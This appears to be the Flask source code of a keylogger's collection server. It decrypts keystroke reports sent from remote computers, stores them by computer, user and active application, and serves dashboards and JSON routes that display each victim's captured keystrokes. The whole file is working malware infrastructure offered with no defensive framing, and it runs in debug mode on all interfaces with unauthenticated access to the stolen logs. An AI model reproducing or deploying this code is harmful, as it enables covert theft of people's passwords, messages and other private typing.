import json
from flask import Flask, render_template, jsonify, request
from flask_cors import CORS
from server_util.util import decrypt_data

app = Flask(__name__, template_folder='templates', static_folder='static')
CORS(app)

# Load existing data (replace with your actual file path)
DATA_FILE = "server/static/json/data.json"

try:
    with open(DATA_FILE, "r") as file:
        json_data = json.load(file)
except FileNotFoundError:
    json_data = {}

@app.route('/data', methods=['GET'])
def get_all_data():
    """Returns all keylog data as JSON."""
    return jsonify(json_data)

@app.route('/computers', methods=['GET'])
def get_computers():
    """Returns a list of computers and users (no logs)."""
    computers_summary = {}
    for computer, users in json_data.items():
        computers_summary[computer] = [
            {"user": user, "apps_count": len(user_data), 
             "keys_logged": sum(len(logs) for app in user_data.values() for logs in app.values())}
            for user, user_data in users.items()
        ]
    return jsonify(computers_summary)

@app.route('/user_data', methods=['GET'])
def get_user_data():
    """Returns logs for a specific user."""
    computer = request.args.get('computer')
    user = request.args.get('user')

    if not computer or not user:
        return jsonify({"error": "Missing parameters"}), 400

    if computer not in json_data or user not in json_data[computer]:
        return jsonify({"error": "User not found"}), 404

    return jsonify(json_data[computer][user])  # Returns only the user's data

@app.route('/')
def index():
    computers_summary = {}

    for computer, users in json_data.items():
        app_count = len(set(app for user in users.values() for app in user.keys()))
        key_count = sum(len(keys) for user in users.values() for app in user.values() for keys in app.values())

        # Store app and key counts per user
        user_data = {
            user: {
                "app_count": len(user_apps),
                "key_count": sum(len(keys) for app in user_apps.values() for keys in app.values())
            }
            for user, user_apps in users.items()
        }

        computers_summary[computer] = {
            "app_count": app_count,
            "key_count": key_count,
            "users": list(users.keys()),  # Keep list for easy access
            "user_data": user_data  # Include app and key counts per user
        }

    return render_template("index.html", computers=computers_summary)

@app.route('/computer/<computer_name>/user/<user_name>')
def user_logs(computer_name, user_name):
    if computer_name not in json_data or user_name not in json_data[computer_name]:
        return {"error": "User or computer not found"}, 404

    user_data = json_data[computer_name][user_name]
    
    formatted_data = {}
    for app, timestamps in user_data.items():
        formatted_data[app] = {
            "total_keys": sum(len(keys) for keys in timestamps.values()),
            "logs": timestamps
        }

    return formatted_data

@app.route('/computer/<computer_name>')
def computer_logs(computer_name):
    if computer_name not in json_data:
        return jsonify({"error": "Computer not found"}), 404
    
    computer_data = json_data[computer_name]
    details = {}
    
    for user, apps in computer_data.items():
        for app, timestamps in apps.items():
            details[app] = {"total_keys": sum(len(keys) for keys in timestamps.values()), "logs": timestamps}
    
    return jsonify(details)

@app.route('/logs', methods=['POST'])
def logs():
    if request.method == 'POST':
        data: str = decrypt_data(request.data).decode()
        data_dict: dict = json.loads(data)
        print(data_dict)

        computer_name = data_dict['computer_name']
        user_name = data_dict['user_name']
        active_app = data_dict['active_app']
        keys = data_dict['keys']
        timestamp = data_dict['timestamp']
        
        json_data.setdefault(computer_name, {}) \
                 .setdefault(user_name, {}) \
                 .setdefault(active_app, {})[timestamp] = keys

        with open(DATA_FILE, 'w') as file:
            json.dump(json_data, file, indent=4)

        return data

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5556, debug=True)
